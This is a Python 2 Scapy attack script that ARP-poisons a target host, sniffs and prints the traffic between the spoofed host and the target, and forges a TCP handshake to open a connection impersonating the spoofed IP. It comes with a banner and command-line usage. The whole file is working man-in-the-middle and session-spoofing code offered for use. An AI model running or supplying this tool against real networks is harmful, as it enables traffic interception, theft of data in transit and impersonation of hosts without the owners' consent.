__author__ = '01'
__author__ += "Binary"
__author__ += "ZeroOne"
__author__ += "Hooman"

from scapy.all import *
from scapy.layers.inet import *
import threading
import sys
import subprocess
import os

conf.verb = 0
conf.route.resync()

os.system("echo 0 > /proc/sys/net/ipv4/ip_forward") # Disable Linux IP Forwarding

def PacketAnalyze(Pck) :

    if((Pck.haslayer(IP)) and ((Pck.getlayer(IP).src == sys.argv[1] and Pck.getlayer(IP).dst == sys.argv[2]) or (Pck.getlayer(IP).src == sys.argv[2] and Pck.getlayer(IP).dst == sys.argv[1]))) :

        if((Pck.getlayer(IP).src == sys.argv[2])) :

            print str(Pck.summary())

            if(Pck.haslayer(Raw)) :

                print Pck.getlayer(Raw)

            #Now The Spoof Session Is Created You Can Control It.

def Sniffing() :

    print "[*] Sniffing ..."

    sniff(iface="eth0", prn=PacketAnalyze)

def SpoofingConnection(SpoofMAC, TargetMAC, SpoofIP, TargetIP, DPort) :

    SYN = Ether(src=SpoofMAC, dst=TargetMAC)/IP(src=SpoofIP, dst=TargetIP)/TCP(sport=2365, dport=int(DPort), flags="S", seq=64)

    print "[+] Configured SYN"

    SYNACK = srp1(SYN, verbose=0)

    print "[+] SYN Sent"

    ACK = Ether(src=SpoofMAC, dst=TargetMAC)/IP(src=SpoofIP, dst=TargetIP)/TCP(sport=int(SYNACK.dport), dport=int(DPort), flags='A', seq = SYNACK.ack, ack = SYNACK.seq + 1)

    print "[+] Configured ACK"

    srp1(ACK)

    print "[+] ACK Sent"

def MITM(SpoofMAC, TargetMAC, SpoofIP, TargetIP) :

    TargetARP = Ether(dst=TargetMAC)/ARP(op=2, psrc=SpoofIP, pdst=TargetIP, hwdst=TargetMAC)

    print "[*] Start ARP Poisoning ..."

    Sniffing_Thread = threading.Thread(target=Sniffing, args=())

    Sniffing_Thread.start()

    sendp(TargetARP, loop=True, inter=0.5)

def GetMAC(IPAddress) :

    R = subprocess.Popen(["arp", "-n", IPAddress], stdout=subprocess.PIPE)

    R = R.communicate()[0]

    R = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", R).groups()[0]

    return R

def Main(SpoofIP, TargetIP, DPort) :

    print "[*] MAC Address Resolving ..."

    SpoofMAC = GetMAC(SpoofIP) #MAC Address Resolve

    TargetMAC = GetMAC(TargetIP) #MAC Address Resolve

    print "[+] Mac Address Resolved"

    MITM_Thread = threading.Thread(target=MITM, args=(SpoofMAC, TargetMAC, SpoofIP, TargetIP))

    MITM_Thread.start()

    SpoofingConnection_Thread = threading.Thread(target=SpoofingConnection, args=(SpoofMAC, TargetMAC, SpoofIP, TargetIP, DPort))

    SpoofingConnection_Thread.start()

    SpoofingConnection_Thread.join()

    MITM_Thread.join()

if __name__ == "__main__" :

    print "[+] Welcome"

    Banner = '''

      000      0
     0   0    01
    1 0   1  0 1
    1  0  1    1
    1   0 1    1
     0   0     1
      000    10001

        =======================================================

     00000
    1     1  100001   0000   1    0  00000      1     00000   0   0
    1        1       1    1  1    0  1    1     1       1      0 0
     00000   00000   0       1    0  1    1     1       1       0
          1  1       0       0    1  00000      0       1       1
    1     1  1       1    1  0    1  1   0      0       1       1
     00000   100001   0000   100001  1    0     0       1       1

    '''

    print Banner

    if(len(sys.argv) != 4) :

        print "Usage : " + str(sys.argv[0]) + " <Spoof IP> <Target IP> <TCP DPort Connection>"
        exit(0)

    Main(sys.argv[1], sys.argv[2], sys.argv[3]) #The Main Function Has Been Invoked
